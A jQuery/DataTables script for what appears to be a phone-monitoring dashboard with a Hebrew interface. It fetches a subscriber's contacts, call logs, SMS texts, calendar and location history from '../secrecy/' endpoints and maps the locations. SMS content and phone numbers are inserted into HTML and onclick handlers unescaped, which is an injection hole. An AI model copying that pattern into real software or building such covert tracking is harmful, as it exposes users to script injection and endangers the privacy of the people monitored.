var scrollingFinished = false;
var firstTimeScroll = true;
var map, iw, task;
var ajaxCounter = 0;
var calendarEvents=null;

jQuery(document).ready(function() {
	//jQuery(".label").each(function(){jQuery(this).corner("30px");});
	loadContacts(activeSimSubscriberId);
	loadPackages(activeSimSubscriberId);
	loadAccounts(activeSimSubscriberId);
	initCal();//loadCalendar(activeSimSubscriberId);
	if (locationInstanceList != null) {
		initialize();
	}
	loadLocation(activeSimSubscriberId);
});

//jQuery(document).ready(function() {
//	loadContacts(activeSimSubscriberId);
//});

function spinner(spinnerId) {
	$(spinnerId).show();
}

function loadContacts(simSubscriberId) {
	jQuery.ajax({
		type : 'POST',
		url : '../secrecy/contacts',
		data : {
			"simSubscriberId" : simSubscriberId
		},
		success : function(data, textStatus) {			
			jQuery('#contactsAjaxTargetDiv').html(data);
			//scrollToPhone("054-471-3543");
			scrollToElement("*all");		
		},
		error : function(XMLHttpRequest, textStatus, errorThrown) {
			//document.location="../auth/login";
			jQuery("#modal-login").click();
		}
	});
}

function loadPackages(simSubscriberId) {
	jQuery.ajax({
		type : 'POST',
		url : '../secrecy/packages',
		data : {
			"simSubscriberId" : simSubscriberId
		},
		success : function(data, textStatus) {
			jQuery('#packagesAjaxTargetDiv').html(data);
			//scrollToPhone("054-471-3543");
			//scrollToElement("*all");
			
		},
		error : function(XMLHttpRequest, textStatus, errorThrown) {
			//document.location="../auth/login";
			jQuery("#modal-login").click();
		}
	});
}

function loadAccounts(simSubscriberId) {
	jQuery.ajax({
		type : 'POST',
		url : '../secrecy/accounts',
		data : {
			"simSubscriberId" : simSubscriberId
		},
		success : function(data, textStatus) {
			jQuery('#accountsAjaxTargetDiv').html(data);
			//scrollToPhone("054-471-3543");
			//scrollToElement("*all");
			
		},
		error : function(XMLHttpRequest, textStatus, errorThrown) {
			//document.location="../auth/login";
			jQuery("#modal-login").click();
		}
	});
}


function loadCalendar(simSubscriberId) {
	jQuery.ajax({
		type : 'POST',
		url : '../secrecy/userCalendar',
		data : {
			"simSubscriberId" : simSubscriberId
		},
		success : function(data, textStatus) {
			//alert(data);			
			calendarEvents = data.userCalendarInstanceList;
			initCal();
			//jQuery('#accountsAjaxTargetDiv').html(data);
			//scrollToPhone("054-471-3543");
			//scrollToElement("*all");
			
		},
		error : function(XMLHttpRequest, textStatus, errorThrown) {
			//document.location="../auth/login";
			jQuery("#modal-login").click();
		}
	});
}


function scrollToPhone(phone) {
	var arr = jQuery('article[data-phone="'+phone+'"]');
	scrollToElement(arr[0]);
	//jQuery("#content_1").mCustomScrollbar('scrollTo', "#" + arr[0].id);
}

function initialize() {
	try {
		MapsGoogle.init(allLocationsTotal, locationInstanceList);
		var myLatLng = new google.maps.LatLng(allLocations[0].latitude,allLocations[0].longitude);
		var myOptions = {
			zoom : 15,
			center : myLatLng,
			mapTypeId : google.maps.MapTypeId.ROADMAP
		};
		map = new google.maps.Map(document.getElementById("gmap_marker"),myOptions);
		google.maps.event.addListenerOnce(map, 'idle', function() {
			fixmap();
		});
		if(allLocationsTotal>0) {
			setMarker(0,true);
		}
	} catch (e) {
		console.log(e.message);
	}
}

window.onresize = function(event) {
	fixmap();
}

function fixmap(){
	if(allLocations!=null){
		google.maps.event.trigger(map, 'resize');
		centerMap(allLocations[0].latitude,allLocations[0].longitude);
	}
}

function fixcal(){
	jQuery(".fc-button-today").click();
}

function setMarker(i){
	new StyledMarker({
		styleIcon : new StyledIcon(StyledIconTypes.MARKER, {
			color : "73B819",
			text :  "" + i,
			starcolor : null,
			fore : 'ffffff'
		}),
		position : new google.maps.LatLng(allLocations[i].latitude,allLocations[i].longitude),
		map : map
	});
	
	if(i+1<allLocationsTotal)
		setTimeout(function(){setMarker(++i,true);}, 10);
}


function setSingleMarker(position){
	new StyledMarker({
		styleIcon : new StyledIcon(StyledIconTypes.MARKER, {
			color : "73B819",
			text : "כאן",
			starcolor : null,
			fore : 'ffffff'
		}),
		position : position,
		map : map
	});
}

function centerMap(latitude, longitude) {
	var pos = new google.maps.LatLng(latitude, longitude);
	map.setCenter(pos);
	map.setZoom(17);
	//setSingleMarker(pos);
}

function loadLocation(simSubscriberId) {
	var oTable = $('#locationTable')
			.dataTable(
					{
						"bDestroy" : true,
						"bProcessing" : true,
						"bServerSide" : true,
						"bSearch" : true,
						"aaSorting" : [ [ 0, "asc" ] ],
						"sAjaxSource" : '../secrecy/location',
						"sAjaxDataProp" : "locationInstanceList",
						"fnServerParams" : function(aoData) {
							aoData.push({
								"name" : "simSubscriberId",
								"value" : simSubscriberId
							});
						},
						"aoColumns" : [ {
							"mData" : "id", "sClass": "vcenter"
						}, {
							"mData" : "address"
						}, {
							"mData" : "accuracyMeters"
						}, {
							"mData" : "provider"
						}, {
							"mData" : "time"
						}, {
							"mData" : "latitude"
						}, {
							"mData" : "longitude"
						} ],
						"aoColumnDefs" : [
								{
									"mRender" : function(data, type, row) {
										result = '<div style="color:blue;cursor: pointer;text-align: center;" onclick="centerMap('
												+ row.latitude
												+ ","
												+ row.longitude
												+ ')">'
												+ '<i class="icon-info-sign text-muted"></i>'
												+ '</div>';
										return result;
									},
									"aTargets" : [ 0 ]
								}, {
									"bVisible" : false,
									"aTargets" : [ 5 ]
								}, {
									"bVisible" : false,
									"aTargets" : [ 6 ]
								} ],
						"aLengthMenu" : [ [ 5, 10 ], [ 5, 10 ] // change per
																// page values
																// here
						],
						// set the initial value
						"iDisplayLength" : 5,
						"sDom" : "<'row'<'col-lg-6 col-sm-6'l><'col-lg-6 col-sm-6'f>r>t<'row'<'col-lg-5 col-sm-5'i><'col-lg-7 col-sm-7'p>>",
						"sPaginationType" : "full_numbers",
						"oLanguage" : {
							"sLengthMenu" : "מציג _MENU_ תוצאות לדף.",
							"sZeroRecords" : "לא נמצאות תוצאות להצגה.",
							"sInfo" : "מציג _START_ עד _END_ מתוך _TOTAL_",
							"sInfoEmpty" : "מציג - 0  מ- 0 מתוך 0 רשומות",
							"sInfoFiltered" : "",// "(מסונן מתוך _MAX_ סה''כ
													// רשומות')",
							"sProcessing" : "טוען נתונים...",
							"sSearch" : "חיפוש :",
							"oPaginate" : {
								"sFirst":    "ראשון",
						        "sPrevious": "קודם",
						        "sNext":     "הבא",
						        "sLast":     "אחרון"
							}
						},
						"fnDrawCallback" : function(oSettings) {
//							if(locationInstanceTotal>0) {
//								setMarker(0,true);
//							}
						}
					});

	jQuery('#locationTable_wrapper .dataTables_filter input').addClass(
			"m-wrap small");
	jQuery('#locationTable_wrapper .dataTables_length select').addClass(
			"m-wrap small");
	jQuery('#locationTable_wrapper .dataTables_length select').select2();

	// sho column for all callLog if needed.
	// ***********************************************************
	// var bVis = oTable.fnSettings().aoColumns[0].bVisible;
	// oTable.fnSetColumnVis(0, (bVis ? false : true),true);
	// jQuery("#callLogNumberThHeader").show();
}
function runEmoji() {
	jQuery('.emoji').emoji();
}

function scrollToElement(element) {
	 if(element=="*all"){
    	loadAllAjaxSections('*all',activeSimSubscriberId,null);
	}else{
		jQuery("#contactsAjaxTargetDiv").slimScroll({
			scrollBy : jQuery(element).offset().top - 381
		});
    	jQuery(element).click();
	} 
}

var lastId = "";

function loadAllAjaxSections(number, simSubscriberId, id) {
	loadCalllogs(number, simSubscriberId, id);

	// jQuery('#chats').html("");
	// jQuery('#chats').addClass("spinner-loading");
	// var int=self.setInterval(function(){
	// if(scrollingFinished){
	// window.clearInterval(int);
	// loadCalllogs(number,simSubscriberId,id);
	// }
	// },100);
}

function customSpinner(show, spinnerObjID) {
	if (show) {
		jQuery("#" + spinnerObjID).show();
	} else {
		jQuery("#" + spinnerObjID).hide();
	}
}

function cSelected(obj) {
	jQuery("#contactsAjaxTargetDiv article.bg-contact-select.lter")
			.removeClass("bg-contact-select lter").addClass("notSelected");
	jQuery(obj).removeClass("notSelected").addClass("bg-contact-select lter");
}

function cOver(obj) {
	if (!jQuery(obj).hasClass("bg-contact-select")) {
		jQuery("#contactsAjaxTargetDiv article.bg-light").removeClass(
				"bg-light");
		jQuery(obj).addClass("bg-light");
	}
}

function loadCalllogs(number, simSubscriberId, id) {

	var oTable = $('#callLogsTable').dataTable(
					{
						"bDestroy" : true,
						"bProcessing" : true,
						"bServerSide" : true,
						"bSearch" : true,
						"aaSorting" : [ [ 2, "desc" ] ],
						"sAjaxSource" : '../secrecy/callLog',
//						"fnServerData": function ( sSource, aoData, fnCallback ) {
//						    jQuery.getJSON( sSource, aoData, function (json) { 
//						            fnCallback(json);
//						        });
//						    }.error(function(jqXHR, statusText, errorThrown) { 
//						    console.log(jqXHR.status);//403 etc.
//						}),
						"fnServerParams" : function(aoData) {
							aoData.push({
								"name" : "number",
								"value" : number
							}, {
								"name" : "simSubscriberId",
								"value" : simSubscriberId
							});
						},
						"sAjaxDataProp" : "callLogInstanceList",
						"aoColumns" : [ {
							"mData" : "phoneNumber"
						},{
							"mData" : "type"
						}, {
							"mData" : "duration"
						}, {
							"mData" : "timeSeconds"
						} ],
						"aoColumnDefs" : [{
	  		                   // `data` refers to the data for the cell (defined by `mData`, which
	  		                   // defaults to the column being worked with, in this case is the first
	  		                   // Using `row[0]` is equivalent.	  		                  
	  		             	   "mRender": function ( data, type, row ) {
		  		                 var result = '';		  		                   
		  		                 if(row.type!=null && row.type!=''){
		  		                	 result = '<img src="../images/callog/'+ row.type +'.png" alt="" style="width: 25px; height: 25px; float: right;" />';
			  		               }
			  		               result +='<div style="vertical-align: middle;cursor:pointer;color:#0D638F;padding-right:30px;width:125px;padding-top: 2px;" onclick="scrollToPhone(\''+data+'\');">' + data + '</div>';
	  		                       return result;
	  		                   },	  		                  
	  		                 "sClass" : "hidden-480","aTargets": [ 0 ]
	  		               }, {
									"mRender" : function(data, type, row) {
										switch (data) {
										case "OUTGOING":
											return '<span class="label label-warning">'
													+ OUTGOING + '</span>';
											break;
										case "INCOMING":
											return '<span class="label label-success">'
													+ INCOMING + '</span>';
											break;
										case "MISSED":
											return '<span class="label label-important">'
													+ MISSED + '</span>';
											break;
										}
										return "";
									},
									"sClass" : "hidden-480 centerContent",
									"aTargets" : [ 1 ]
								}, {
									"mRender" : function(data, type, row) {
										return row.formatedDuration;
									},
									"sClass" : "hidden-480",
									"aTargets" : [ 2 ]
								}, {
									"mRender" : function(data, type, row) {
										return row.timeSeconds;
									},
									"sClass" : "hidden-480",
									"aTargets" : [ 3 ]
								} ],
						"aLengthMenu" : [ [ 5, 15, 20, -1 ],
								[ 5, 15, 20, "All" ] // change per page
														// values here
						],
						// set the initial value
						"iDisplayLength" : 5,
						"sDom" : "<'row'<'col-lg-6 col-sm-6'l><'col-lg-6 col-sm-6'f>r>t<'row'<'col-lg-5 col-sm-5'i><'col-lg-7 col-sm-7'p>>",
						"sPaginationType" : "full_numbers",
						"oLanguage" : {
							"sLengthMenu" : "מציג _MENU_ תוצאות לדף.",
							"sZeroRecords" : "לא נמצאות תוצאות להצגה.",
							"sInfo" : "מציג _START_ עד _END_ מתוך _TOTAL_",
							"sInfoEmpty" : "מציג - 0  מ- 0 מתוך 0 רשומות",
							"sInfoFiltered" : "",// "(מסונן מתוך _MAX_ סה''כ
													// רשומות')",
							"sProcessing" : "טוען נתונים...",
							"sSearch" : "חיפוש :",
							"oPaginate" : {
								"sFirst":    "ראשון",
						        "sPrevious": "קודם",
						        "sNext":     "הבא",
						        "sLast":     "אחרון"
							}
						},
						"fnDrawCallback" : function(oSettings) {
							if (number != "*all" && lastId != id) {
								jQuery("#totalCalllogs").html(oSettings._iRecordsTotal);
								loadSmsesTable(number, simSubscriberId, id);
							} else if(number == "*all"){
								loadAllSmsesTable(number, simSubscriberId, id);
							} else {
								jQuery('#chats').removeClass("spinner-loading");
							}
							ajaxCounter++;
						}
					});

	jQuery('#callLogsTable .group-checkable').change(function() {
		var set = jQuery(this).attr("data-set");
		var checked = jQuery(this).is(":checked");
		jQuery(set).each(function() {
			if (checked) {
				$(this).attr("checked", true);
			} else {
				$(this).attr("checked", false);
			}
		});
		jQuery.uniform.update(set);
	});

	jQuery('#callLogsTable_wrapper .dataTables_filter input').addClass(
			"m-wrap small"); // modify
	// table
	// search
	// input
	jQuery('#callLogsTable_wrapper .dataTables_length select').addClass(
			"m-wrap small"); // modify
	// table
	// per
	// page
	// dropdown
	jQuery('#callLogsTable_wrapper .dataTables_length select').select2(); // initialize
	// select2
	// dropdown
}

function loadSmses(number, simSubscriberId, id) {
	jQuery.ajax({
		type : 'POST',
		data : {
			'number' : number,
			"simSubscriberId" : simSubscriberId,
			"contactId" : id
		},
		url : '../secrecy/sms',
		success : function(data, textStatus) {
			jQuery('#chats').html(data);
			lastId = id;
			jQuery('#chats').removeClass("spinner-loading");
		},
		error : function(XMLHttpRequest, textStatus, errorThrown) {

		}
	});
}


function loadAllSmsesTable(number, simSubscriberId, id) {

	var oTable = $('#smsTable').dataTable(
					{
						"bDestroy" : true,
						"bProcessing" : true,
						"bServerSide" : true,
						"bSearch" : true,
						"aaSorting" : [ [ 2, "desc" ] ],
						"sAjaxSource" : '../secrecy/sms',
						"fnServerParams" : function(aoData) {
							aoData.push({
								"name" : "renderType",
								"value" : "table"
							}, {
								"name" : "number",
								"value" : number
							}, {
								"name" : "simSubscriberId",
								"value" : simSubscriberId
							}, {
								"name" : "contactId",
								"value" : id
							});
						},
						"sAjaxDataProp" : "smsInstanceList",
						"aoColumns" : [ {
							"mData" : "[0].address"
						},{
							"mData" : "[0].folderName"
						}, {
							"mData" : "[0].msg"
						}, {
							"mData" : "[0].time"
						} ],
						"aoColumnDefs" : [{
				  		                   // `data` refers to the data for the cell (defined by `mData`, which
				  		                   // defaults to the column being worked with, in this case is the first
				  		                   // Using `row[0]` is equivalent.	  		                  
				  		             	   "mRender": function ( data, type, row ) {
					  		                 var result = '';		  		                   
					  		                 if(row[0].folderName!=null && row[0].folderName!=''){
					  		                	 result = '<img src="../images/sms/'+ row[0].folderName +'.png" alt="" style="width: 25px; height: 25px; float: right;" />';
						  		               }
						  		               result +='<div style="vertical-align: middle;cursor:pointer;color:#0D638F;padding-right:30px;width:125px;padding-top: 2px;" onclick="scrollToPhone(\''+data+'\');">' + data + '</div>';
				  		                       return result;
				  		                   },	  		                  
				  		                  "sClass" : "hidden-480",
				  		                  "aTargets": [ 0 ]
				  		               },				  		             
									   {
											"mRender" : function(data, type, row) {
												switch (row[0].folderName) {
												case "sent":
													return '<span class="label label-warning">'
															+ sent + '</span>';
													break;
												case "inbox":
													return '<span class="label label-success">'
															+ inbox + '</span>';
													break;
												}
												return "";
											},
										"sClass" : "hidden-480 centerContent",
										"aTargets" : [ 1 ]
										},
				  		               {
											"mRender" : function(data, type, row) {
											return '<div class="msgContent">'
													+ row[0].msg + '</div>';
											},
											"sClass" : "emoji",
											"aTargets" : [ 2 ]
										} ],
						"aLengthMenu" : [ [ 5, 15, 20, -1 ],
						                  [ 5, 15, 20, "All" ] ],
						// set the initial value
						"iDisplayLength" : 5,
						"sDom" : "<'row'<'col-lg-6 col-sm-6'l><'col-lg-6 col-sm-6'f>r>t<'row'<'col-lg-5 col-sm-5'i><'col-lg-7 col-sm-7'p>>", // "sDom":
						// "<'row-fluid'<'span6'l><'span0'f>r>t<'row-fluid'<'span4'i><'span8'p>>",
						"sPaginationType" : "full_numbers",
						"oLanguage" : {
							"sLengthMenu" : "מציג _MENU_ תוצאות לדף.",
							"sZeroRecords" : "לא נמצאות תוצאות להצגה.",
							"sInfo" : "מציג _START_ עד _END_ מתוך _TOTAL_",
							"sInfoEmpty" : "מציג - 0  מ- 0 מתוך 0 רשומות",
							"sInfoFiltered" : "",// "(מסונן מתוך _MAX_ סה''כ
													// רשומות')",
							"sProcessing" : "טוען נתונים...",
							"sSearch" : "חיפוש :",
							"oPaginate" : {
								"sFirst":    "ראשון",
						        "sPrevious": "קודם",
						        "sNext":     "הבא",
						        "sLast":     "אחרון"
							}
						},
						"fnDrawCallback" : function(oSettings) {
							runEmoji();
							jQuery("#totalSms1").html(oSettings._iRecordsTotal);
							jQuery("#totalSms2").html(oSettings._iRecordsTotal);
							if (oSettings._iRecordsTotal > 0 && number!="*all") {
								jQuery("#smschat").show();
							} else {
								jQuery("#smschat").hide();
							}
							if (lastId != id) {
								//loadSmses(number, simSubscriberId, id);
							}
							ajaxCounter++;
						}
					});

	jQuery('#smsTable .group-checkable').change(function() {
		var set = jQuery(this).attr("data-set");
		var checked = jQuery(this).is(":checked");
		jQuery(set).each(function() {
			if (checked) {
				$(this).attr("checked", true);
			} else {
				$(this).attr("checked", false);
			}
		});
		jQuery.uniform.update(set);
	});


	jQuery('#smsTable_wrapper .dataTables_filter input').addClass(
			"m-wrap small"); // modify
	// table
	// search
	// input
	jQuery('#smsTable_wrapper .dataTables_length select').addClass(
			"m-wrap small"); // modify
	// table
	// per
	// page
	// dropdown
	jQuery('#smsTable_wrapper .dataTables_length select').select2(); // initialize
	// select2
	// dropdown
}


function loadSmsesTable(number, simSubscriberId, id) {

	var oTable = $('#smsTable')
			.dataTable(
					{
						"bDestroy" : true,
						"bProcessing" : true,
						"bServerSide" : true,
						"bSearch" : true,
						"aaSorting" : [ [ 2, "desc" ] ],
						"sAjaxSource" : '../secrecy/sms',
						"fnServerParams" : function(aoData) {
							aoData.push({
								"name" : "renderType",
								"value" : "table"
							}, {
								"name" : "number",
								"value" : number
							}, {
								"name" : "simSubscriberId",
								"value" : simSubscriberId
							}, {
								"name" : "contactId",
								"value" : id
							});
						},
						"sAjaxDataProp" : "smsInstanceList",
						"aoColumns" : [ {
							"mData" : "address"
						},{
							"mData" : "folderName"
						}, {
							"mData" : "msg"
						}, {
							"mData" : "time"
						} ],
						"aoColumnDefs" : [{
				  		                   // `data` refers to the data for the cell (defined by `mData`, which
				  		                   // defaults to the column being worked with, in this case is the first
				  		                   // Using `row[0]` is equivalent.	  		                  
				  		             	   "mRender": function ( data, type, row ) {
					  		                 var result = '';		  		                   
					  		                 if(row.folderName!=null && row.folderName!=''){
					  		                	 result = '<img src="../images/sms/'+ row.folderName +'.png" alt="" style="width: 25px; height: 25px; float: right;" />';
						  		               }
						  		               result +='<div style="vertical-align: middle;cursor:pointer;color:#0D638F;padding-right:30px;width:125px;padding-top: 2px;" onclick="scrollToPhone(\''+data+'\');">' + data + '</div>';
				  		                       return result;
				  		                   },	  		                  
				  		                  "sClass" : "hidden-480",
				  		                  "aTargets": [ 0 ]
				  		               },				  		             
									   {
											"mRender" : function(data, type, row) {
												switch (data) {
												case "sent":
													return '<span class="label label-warning">'
															+ sent + '</span>';
													break;
												case "inbox":
													return '<span class="label label-success">'
															+ inbox + '</span>';
													break;
												}
												return "";
											},
										"sClass" : "hidden-480 centerContent",
										"aTargets" : [ 1 ]
										},
				  		               {
											"mRender" : function(data, type, row) {
											return '<div class="msgContent">'
													+ data + '</div>';
											},
											"sClass" : "emoji",
											"aTargets" : [ 2 ]
										} ],
						"aLengthMenu" : [ [ 5, 15, 20, -1 ],
						                  [ 5, 15, 20, "All" ] ],
						// set the initial value
						"iDisplayLength" : 5,
						"sDom" : "<'row'<'col-lg-6 col-sm-6'l><'col-lg-6 col-sm-6'f>r>t<'row'<'col-lg-5 col-sm-5'i><'col-lg-7 col-sm-7'p>>", // "sDom":
						// "<'row-fluid'<'span6'l><'span0'f>r>t<'row-fluid'<'span4'i><'span8'p>>",
						"sPaginationType" : "full_numbers",
						"oLanguage" : {
							"sLengthMenu" : "מציג _MENU_ תוצאות לדף.",
							"sZeroRecords" : "לא נמצאות תוצאות להצגה.",
							"sInfo" : "מציג _START_ עד _END_ מתוך _TOTAL_",
							"sInfoEmpty" : "מציג - 0  מ- 0 מתוך 0 רשומות",
							"sInfoFiltered" : "",// "(מסונן מתוך _MAX_ סה''כ
													// רשומות')",
							"sProcessing" : "טוען נתונים...",
							"sSearch" : "חיפוש :",
							"oPaginate" : {
								"sFirst":    "ראשון",
						        "sPrevious": "קודם",
						        "sNext":     "הבא",
						        "sLast":     "אחרון"
							}
						},
						"fnDrawCallback" : function(oSettings) {
							runEmoji();
							jQuery("#totalSms1").html(oSettings._iRecordsTotal);
							jQuery("#totalSms2").html(oSettings._iRecordsTotal);
							if (oSettings._iRecordsTotal > 0) {
								jQuery("#smschat").show();
							} else {
								jQuery("#smschat").hide();
							}
							if (lastId != id) {
								loadSmses(number, simSubscriberId, id);
							}
							ajaxCounter++;
						}
					});

	jQuery('#smsTable .group-checkable').change(function() {
		var set = jQuery(this).attr("data-set");
		var checked = jQuery(this).is(":checked");
		jQuery(set).each(function() {
			if (checked) {
				$(this).attr("checked", true);
			} else {
				$(this).attr("checked", false);
			}
		});
		jQuery.uniform.update(set);
	});

	jQuery('#smsTable_wrapper .dataTables_filter input').addClass(
			"m-wrap small"); // modify
	// table
	// search
	// input
	jQuery('#smsTable_wrapper .dataTables_length select').addClass(
			"m-wrap small"); // modify
	// table
	// per
	// page
	// dropdown
	jQuery('#smsTable_wrapper .dataTables_length select').select2(); // initialize
	// select2
	// dropdown
}

function hideContacts() {
	jQuery("#contacts_panel").hide();
	jQuery("#left_panels").addClass("col-sm-12").removeClass("col-sm-9");
}

function showContacts() {
	jQuery("#left_panels").removeClass("col-sm-12").addClass("col-sm-9");
	jQuery("#contacts_panel").show();
}

function initCal(){	
	var calendar = $('#calendar').fullCalendar({
		defaultView: 'month',
		header: {
			left: 'month,agendaWeek,agendaDay',
			center: 'title',
			right: 'prev,next today'
		},
		isRTL:true,	
		editable: false,
		loading: function(bool) {
			if (bool) $('#loading').show();
			else $('#loading').hide();
		},
		events:'../secrecy/userCalendar' + "?simSubscriberId=" +  activeSimSubscriberId
	});	
}